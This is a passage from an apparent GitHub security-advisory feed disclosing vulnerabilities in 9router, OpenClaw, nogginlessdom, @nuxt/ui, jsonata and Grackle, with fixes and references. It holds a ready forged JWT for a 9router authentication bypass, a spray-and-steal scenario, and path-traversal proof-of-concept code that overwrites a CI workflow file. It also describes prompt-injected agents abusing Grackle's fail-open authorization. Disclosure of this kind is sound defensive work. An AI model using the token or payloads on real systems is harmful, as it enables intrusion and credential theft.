console.log(token); // example a valid auth_token=eyJhbGciOiJIUzI1NiJ9.eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJpYXQiOjE3Nzg3Njk4NTYsImV4cCI6MjkxNDg0MzQ1Nn0.enMLEqYZKFuzxkmRH6qd3E-Ub-20wOjmiEfP4KyIG6w
</code></pre>
<p><strong>Step 2.</strong> Set the forged token as the <code>auth_token</code> cookie. And access the <code>http://&lt;target&gt;/dashboard</code> - completely authentication bypass </p>
<h3 id="attack-scenario">Attack Scenario:</h3>
<ul>
<li>Attacker can use this JWT to spray to all server that they found in the internet and gain dashboard access if a server doesn't set JWT_SECRET</li>
<li>Then they can steal valuable API Key , Auth Token via http:// target /api/settings/database</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li>A successful attack grants attacker <strong>full API Key, Auth Token</strong> that 9router hold</li>
<li>They can <strong>read</strong> 9router apikey, <strong>change</strong> 9router password ,shutdown 9router, <strong>Modify</strong> everything</li>
<li><strong>Pivot</strong> via the MCP stdio→SSE bridge exposed at <code>/api/mcp/</code>  (exploit CVE-2026-46339)</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p><strong>Require</strong> <code>JWT_SECRET</code> at startup and fail fast rather than falling back silently:</p>
<pre><code class="language-js">const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) {
  throw new Error(
    "JWT_SECRET environment variable is not set. " +
    "Generate one with: openssl rand -hex 32"
  );
}
const SECRET = new TextEncoder().encode(jwtSecret);
</code></pre>
<p>Alternatively, auto-generate a random secret on first boot and persist it to the data directory — but <strong>never</strong> fall back to a publicly known constant.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-jphh-m39h-6gwx">https://github.com/decolua/9router/security/advisories/GHSA-jphh-m39h-6gwx</a></li>
<li><a href="https://github.com/advisories/GHSA-jphh-m39h-6gwx">https://github.com/advisories/GHSA-jphh-m39h-6gwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jphh-m39h-6gwx</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-02T20:56:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: QQBot native approval buttons did not enforce configured approver identity]]></title>
        <id>https://github.com/advisories/GHSA-hx4v-668p-g2qr</id>
        <link href="https://github.com/advisories/GHSA-hx4v-668p-g2qr"/>
        <updated>2026-07-02T20:50:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-mgq6-vr84-7m2j. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.18 contains an authorization bypass vulnerability in QQBot native approval buttons that fails to enforce configured approver identity. Non-approver users can click approval buttons to resolve pending exec or plugin approval requests without proper authorization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mgq6-vr84-7m2j">https://github.com/openclaw/openclaw/security/advisories/GHSA-mgq6-vr84-7m2j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35630">https://nvd.nist.gov/vuln/detail/CVE-2026-35630</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-qqbot-missing-approver-identity-enforcement-in-native-approval-buttons">https://www.vulncheck.com/advisories/openclaw-qqbot-missing-approver-identity-enforcement-in-native-approval-buttons</a></li>
<li><a href="https://github.com/advisories/GHSA-hx4v-668p-g2qr">https://github.com/advisories/GHSA-hx4v-668p-g2qr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx4v-668p-g2qr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-29T18:31:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/nogginlessdom] @asymmetric-effort/nogginlessdom vulnerable to ReDoS via user-controlled regex in HTMLInputElement pattern validation]]></title>
        <id>https://github.com/advisories/GHSA-x4hg-hfwf-p9mw</id>
        <link href="https://github.com/advisories/GHSA-x4hg-hfwf-p9mw"/>
        <updated>2026-07-02T20:20:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>HTMLInputElement.checkValidity()</code> method constructed a <code>RegExp</code> directly from the user-controlled <code>pattern</code> property without any sanitization or timeout protection. This allowed an attacker to inject a regex with catastrophic backtracking, freezing the event loop.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in commit <a href="https://github.com/asymmetric-effort/NogginLessDom/commit/25a3cbac665fae5663f8b71c073b80c3152dbe7b">https://github.com/asymmetric-effort/NogginLessDom/commit/25a3cbac665fae5663f8b71c073b80c3152dbe7b</a> on <code>main</code>. Added:</p>
<ul>
<li>Pattern length limit (1024 characters)</li>
<li>Nested quantifier detection (<code>hasNestedQuantifiers</code>) that rejects patterns like <code>(a+)+</code> before constructing the regex</li>
<li>Patterns exceeding limits are treated as non-matching (safe default)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/NogginLessDom/security/advisories/GHSA-x4hg-hfwf-p9mw">https://github.com/asymmetric-effort/NogginLessDom/security/advisories/GHSA-x4hg-hfwf-p9mw</a></li>
<li><a href="https://github.com/asymmetric-effort/NogginLessDom/commit/25a3cbac665fae5663f8b71c073b80c3152dbe7b">https://github.com/asymmetric-effort/NogginLessDom/commit/25a3cbac665fae5663f8b71c073b80c3152dbe7b</a></li>
<li><a href="https://github.com/advisories/GHSA-x4hg-hfwf-p9mw">https://github.com/advisories/GHSA-x4hg-hfwf-p9mw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x4hg-hfwf-p9mw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T20:20:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@asymmetric-effort/nogginlessdom] @asymmetric-effort/nogginlessdom's Path Traversal in matchFileSnapshot allows arbitrary file write]]></title>
        <id>https://github.com/advisories/GHSA-322x-v876-g883</id>
        <link href="https://github.com/advisories/GHSA-322x-v876-g883"/>
        <updated>2026-07-02T20:19:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>matchFileSnapshot</code> function in <code>src/assertions/snapshots.ts</code> accepted a <code>filePath</code> parameter with zero validation. When snapshot update mode was active (<code>UPDATE_SNAPSHOTS=1</code> or <code>setUpdateMode('all')</code>), an attacker who controls test input could write arbitrary content to any filesystem path the process has write access to, including creating intermediate directories.</p>
<h2 id="affected-code">Affected Code</h2>
<p><strong>File:</strong> <code>src/assertions/snapshots.ts</code>, lines 732-769</p>
<pre><code class="language-typescript">export function matchFileSnapshot(actual: unknown, filePath: string): void {
  const serialized = serialize(actual);
  const mode = resolveUpdateMode();
  const fileExists = fs.existsSync(filePath);

  if (!fileExists) {
    if (mode === 'all' || mode === 'new') {
      const dir = path.dirname(filePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      fs.writeFileSync(filePath, serialized, 'utf-8');
</code></pre>
<p>The <code>filePath</code> flows from <code>expect(value).toMatchFileSnapshot(filePath)</code> at <code>index.ts:1033-1035</code> with no sanitization, no check that the path is within an expected directory, and no symlink resolution.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-typescript">import { expect, setUpdateMode } from '@asymmetric-effort/nogginlessdom';

setUpdateMode('all');

// Writes arbitrary content to any writable path
expect('malicious content').toMatchFileSnapshot('/tmp/exploit/payload.txt');

// Path traversal via relative components
expect('data').toMatchFileSnapshot('../../../tmp/evil.txt');

// In CI environments, could overwrite CI config
expect('injected step').toMatchFileSnapshot('/home/runner/.github/workflows/backdoor.yml');
</code></pre>
<h2 id="impact">Impact</h2>
<p>In CI/CD environments where test files may come from untrusted pull requests, this allows writing to any writable filesystem location with directory creation. An attacker could overwrite configuration files, inject code into build artifacts, or modify CI pipeline definitions.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in commit <a href="https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d">https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d</a> on <code>main</code>. The <code>matchFileSnapshot</code> function now validates that the resolved file path is within the project root directory (defaults to <code>process.cwd()</code>, configurable via optional <code>projectRoot</code> parameter). Paths that resolve outside the project directory are rejected with a descriptive error.</p>
<pre><code class="language-typescript">export function matchFileSnapshot(
  actual: unknown,
  filePath: string,
  projectRoot?: string,
): void {
  const root = projectRoot ?? process.cwd();
  const resolved = path.resolve(root, filePath);
  if (!resolved.startsWith(root + path.sep) &amp;&amp; resolved !== root) {
    throw new Error(
      `File snapshot path must be within the project directory: ${filePath}`,
    );
  }
  // ... all subsequent file I/O uses `resolved` instead of `filePath`
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/asymmetric-effort/NogginLessDom/security/advisories/GHSA-322x-v876-g883">https://github.com/asymmetric-effort/NogginLessDom/security/advisories/GHSA-322x-v876-g883</a></li>
<li><a href="https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d">https://github.com/asymmetric-effort/NogginLessDom/commit/785e6ac6e124d1a89b3ccf40bbd75fc8e4cb215d</a></li>
<li><a href="https://github.com/advisories/GHSA-322x-v876-g883">https://github.com/advisories/GHSA-322x-v876-g883</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-322x-v876-g883</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T20:19:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nuxt/ui] @nuxt/ui: UAuthForm / UForm SSR markup omits `method`, leaking credentials via GET if submitted before hydration]]></title>
        <id>https://github.com/advisories/GHSA-gj2h-2fpw-fhv9</id>
        <link href="https://github.com/advisories/GHSA-gj2h-2fpw-fhv9"/>
        <updated>2026-07-02T20:16:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>UForm</code> and <code>UAuthForm</code> render a server-side <code>&lt;form&gt;</code> element with no <code>method</code> and no <code>action</code> attribute, relying on a hydrated <code>@submit.prevent</code> handler to intercept submission. If a user submits the form before Vue hydration has attached the handler (autofill plus Enter on a slow network, JS bundle blocked by CSP or CDN failure, etc.), the browser performs the native default: a <code>GET</code> to the current URL with every named field, including <code>&lt;input type="password"&gt;</code>, serialised into the query string.</p>
<h3 id="details">Details</h3>
<p><code>src/runtime/components/Form.vue</code> (around the template's <code>&lt;form&gt;</code> element) emits:</p>
<pre><code class="language-vue">&lt;component
  :is="parentBus ? 'div' : 'form'"
  :id="formId"
  ref="formRef"
  :class="ui({ class: [uiProp?.base, props.class] })"
  @submit.prevent="onSubmitWrapper"
&gt;
</code></pre>
<p>No <code>method</code>, no <code>action</code>. <code>@submit.prevent</code> is the only thing stopping native submission, and it only exists after hydration. <code>UAuthForm</code> composes <code>UForm</code> and inherits the same shape.</p>
<p>The SSR snapshot of <code>UAuthForm</code> (<code>test/components/__snapshots__/AuthForm.spec.ts.snap</code>) shows the rendered markup, with <code>&lt;input type="password" name="password"&gt;</code> inside a <code>&lt;form&gt;</code> that has no <code>method</code>.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Reported by @nimonian:</p>
<ol>
<li>Create a minimal Nuxt app with a <code>UAuthForm</code>.</li>
<li>Build for production and visit in a browser with network throttling at 4G or slower.</li>
<li>Enter credentials.</li>
<li>Submit (or let autofill + Enter fire before hydration).</li>
</ol>
<p>The URL becomes <code>/login?email=…&amp;password=…</code>. Reproducible deterministically in Playwright by triggering submit immediately on <code>load</code>.</p>
<h3 id="impact">Impact</h3>
<p>Any application using <code>UAuthForm</code> (or <code>UForm</code> with credential-shaped fields) as documented. The cleartext password lands in:</p>
<ul>
<li>the address bar,</li>
<li><code>window.history</code>,</li>
<li>the <code>Referer</code> header of every same-origin subresource fetched from the resulting URL,</li>
<li>access logs of any reverse proxy, CDN, or WAF that records request URLs.</li>
</ul>
<h3 id="patch">Patch</h3>
<p>Default the rendered <code>&lt;form&gt;</code> to <code>method="post"</code> so the pre-hydration fallback submits as POST rather than GET. Vue's <code>@submit.prevent</code> still intercepts the hydrated case; the attribute only matters in the race window. Applications that explicitly want native GET submission can opt back in by passing <code>method="get"</code>.</p>
<h3 id="credit">Credit</h3>
<p>Reported by @nimonian. Originally filed as <code>GHSA-92g7-2fpq-hmq8</code> against <code>nuxt/nuxt</code>; moved here because the affected code lives in <code>@nuxt/ui</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nuxt/ui/security/advisories/GHSA-gj2h-2fpw-fhv9">https://github.com/nuxt/ui/security/advisories/GHSA-gj2h-2fpw-fhv9</a></li>
<li><a href="https://github.com/advisories/GHSA-gj2h-2fpw-fhv9">https://github.com/advisories/GHSA-gj2h-2fpw-fhv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj2h-2fpw-fhv9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-02T20:16:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] jsonata: Malicious inputs to "$toMillis" function can cause resource exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-86vw-mfpg-wwv9</id>
        <link href="https://github.com/advisories/GHSA-86vw-mfpg-wwv9"/>
        <updated>2026-07-02T20:13:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In JSONata <code>&lt;v2.2.0</code>, it is possible to craft non-matching inputs to the <a href="https://docs.jsonata.org/date-time-functions#tomillis">$toMillis</a> function that cause superlinear backtracking in the ISO-8601 validation regex. This may lead to denial of service in applications that evaluate user-provided JSONata expressions.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in JSONata version &gt;= 2.2.0 via fixes that include <a href="https://github.com/jsonata-js/jsonata/pull/782">https://github.com/jsonata-js/jsonata/pull/782</a> and <a href="https://github.com/jsonata-js/jsonata/pull/793">https://github.com/jsonata-js/jsonata/pull/793</a>. Applications that evaluate user-provided expressions should update ASAP to prevent exploitation.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0</a></p>
<h3 id="credit">Credit</h3>
<p>Thank you to Doruk Tan Öztürk for disclosing this issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jsonata-js/jsonata/security/advisories/GHSA-86vw-mfpg-wwv9">https://github.com/jsonata-js/jsonata/security/advisories/GHSA-86vw-mfpg-wwv9</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/782">https://github.com/jsonata-js/jsonata/pull/782</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/793">https://github.com/jsonata-js/jsonata/pull/793</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/80ba95d170f74e3f20f4f36b8b77d8c85cea7686">https://github.com/jsonata-js/jsonata/commit/80ba95d170f74e3f20f4f36b8b77d8c85cea7686</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/d6ffc17cb16a8e53c222205bd274624e919cce0b">https://github.com/jsonata-js/jsonata/commit/d6ffc17cb16a8e53c222205bd274624e919cce0b</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-86vw-mfpg-wwv9">https://github.com/advisories/GHSA-86vw-mfpg-wwv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-86vw-mfpg-wwv9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T20:13:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/auth] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:35:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@grackle-ai/plugin-core] Grackle: Fail-open authorization in the MCP tool layer lets scoped agents perform cross-task and cross-session mutations (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-f9ff-5x35-7gfw</id>
        <link href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw"/>
        <updated>2026-07-02T19:35:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Authorization for scoped (agent) MCP callers is enforced <strong>inline, per tool</strong>, and is applied inconsistently — several mutating tools silently omit the ancestry/workspace check that their siblings perform. Because the MCP server authenticates all outbound gRPC with the full server API key and the backend gRPC handlers perform <strong>no caller-based authorization</strong>, the MCP tool layer is the <em>sole</em> authorization boundary. A malicious or prompt-injected scoped agent can therefore perform cross-task and cross-session operations it should not be allowed to (an IDOR / privilege-boundary bypass).</p>
<p>This advisory bundles the audit's <strong>Systemic Pattern A</strong> findings: <strong>F2, F6, F7, F12</strong> (and the duplicate F19).</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>@grackle-ai/mcp</code> (with <code>@grackle-ai/plugin-core</code> / <code>@grackle-ai/auth</code>) at <strong>0.132.1</strong> and earlier.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>mcp-server.ts:111-127</code> (<code>createGrpcClients</code>) sets <code>Authorization: Bearer ${apiKey}</code> (the full server key) on every outbound gRPC call.</li>
<li>Backend handlers (<code>updateTask</code>, <code>deleteTask</code>, <code>resumeTask</code>, <code>killAgent</code>, <code>getTask</code> in <code>plugin-core</code>) take only the request message — no <code>AuthContext</code> — and act on whatever ID is passed.</li>
<li>Therefore scope must be enforced in each MCP tool handler. Some call <code>assertCallerIsAncestor</code> (<code>task_complete</code>, <code>task_start</code>, <code>session_attach</code>, <code>session_send_input</code>); their destructive siblings do not. New tools that forget the check <strong>fail open</strong>.</li>
</ul>
<h2 id="f2--task_update--task_delete--task_resume-bypass-ancestry-high">F2 — task_update / task_delete / task_resume bypass ancestry (High)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/task.ts:226</code> (task_update), <code>:393</code> (task_delete), <code>:465</code> (task_resume).</p>
<p>These accept an arbitrary <code>taskId</code> with only a <code>ROOT_TASK_ID</code> special-case and no <code>assertCallerIsAncestor</code>. The central dispatcher hardcodes its workspace gate to <code>name === "task_show"</code>, and these tools' Zod schemas have no <code>workspaceId</code> field (so the blanket injection is stripped). They are not in <code>DEFAULT_SCOPED_MCP_TOOLS</code> but <strong>are</strong> in the shipped <code>ORCHESTRATOR_MCP_TOOLS</code> / <code>ADMIN_MCP_TOOLS</code> presets.</p>
<p><strong>Exploit:</strong> a scoped agent under the orchestrator persona learns a sibling/parent/cross-workspace task ID (via <code>task_list</code>/<code>task_search</code>), then <code>task_delete {taskId: &lt;victim&gt;}</code> (permanently destroys another agent's or the human parent's work) or <code>task_update</code> to flip a sibling to <code>complete</code>/<code>failed</code> or rewrite its dependency DAG and budgets.</p>
<h2 id="f6--session_kill--session_resume-bypass-ancestry-medium">F6 — session_kill / session_resume bypass ancestry (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/tools/session.ts:95</code> (session_resume), <code>:178</code> (session_kill).</p>
<p>Call <code>client.killAgent</code> / <code>client.resumeAgent</code> directly with no auth context, unlike <code>session_attach</code>/<code>session_send_input</code>. <code>session_kill</code> is in the orchestrator preset. <strong>Exploit:</strong> cross-session SIGKILL DoS against a sibling agent or the root orchestrator; foreign session resume.</p>
<h2 id="f7--workspaceless-scoped-token-fails-open-to-all-workspaces-medium">F7 — Workspaceless scoped token fails open to all workspaces (Medium)</h2>
<p><strong>Location:</strong> <code>packages/mcp/src/mcp-server.ts:565-600</code>.</p>
<p>The per-task cross-workspace check (<code>task_show</code> block) is gated on <code>authContext.workspaceId</code> being truthy. A task created without a workspace (a supported config) mints a scoped token with <code>pid: ""</code> → <code>workspaceId: undefined</code>, so the check is skipped and the injected <code>workspaceId</code> becomes <code>""</code>, which the backend treats as "all workspaces." <strong>Exploit:</strong> a malicious agent in a workspaceless session calls <code>task_list</code> (no args) → reads every task in every workspace, then <code>task_show {taskId}</code> cross-workspace (title/description/branch/review-notes). <code>schedule_show</code> (in the default scoped allowlist) resolves by ID with no workspace check. Read-only cross-workspace disclosure.</p>
<h2 id="f12--scoped-token-revocation-is-dead-code-low">F12 — Scoped-token revocation is dead code (Low)</h2>
<p><strong>Location:</strong> <code>packages/auth/src/scoped-token.ts:23,142-149</code>.</p>
<p>The consuming check is wired (<code>auth-middleware.ts:90-92</code>), but <code>revokeTask()</code> is <strong>never called outside tests</strong> — no task-abort/stop flow invokes it — and the backing <code>revokedTasks</code> Map is in-memory only (lost on restart). A compromised agent that exfiltrated its scoped token keeps authenticating for the full 24h TTL regardless of task lifecycle.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li><strong>Systemic fix:</strong> enforce scope <strong>centrally</strong> in the <code>CallToolRequest</code> dispatcher (<code>mcp-server.ts</code>) via a per-tool <code>targetTaskIdArg</code> / <code>targetSessionIdArg</code> descriptor so any tool that targets a task/session <strong>fails closed</strong> unless the caller is an ancestor (or self).</li>
<li>Immediately, add <code>assertCallerIsAncestor</code> (or self-or-ancestor) to <code>task_update</code>, <code>task_delete</code>, <code>task_resume</code>, <code>session_kill</code>, <code>session_resume</code>, mirroring <code>task_complete</code>/<code>task_start</code>.</li>
<li>F7: do <strong>not</strong> fail open on empty <code>workspaceId</code> — treat a scoped non-root caller with no workspace as having access to <em>no</em> workspace; apply the <code>task_show</code> membership check whenever the caller is scoped and not <code>ROOT_TASK_ID</code>; add a per-id membership check to <code>schedule_show</code>.</li>
<li>F12: wire <code>revokeTask()</code> into task-abort/stop flows with SQLite-backed persistence (like channel-grant revocation), or remove the dead API and document the 24h window.</li>
<li>Add regression tests mirroring the existing <code>task_complete</code> ancestor tests for each mutator.</li>
</ul>
<h2 id="cwes">CWEs</h2>
<p>CWE-862 (Missing Authorization), CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR), CWE-613 (Insufficient Session Expiration).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/nick-pape/grackle/security/advisories/GHSA-f9ff-5x35-7gfw</a></li>
<li><a href="https://github.com/advisories/GHSA-f9ff-5x35-7gfw">https://github.com/advisories/GHSA-f9ff-5x35-7gfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
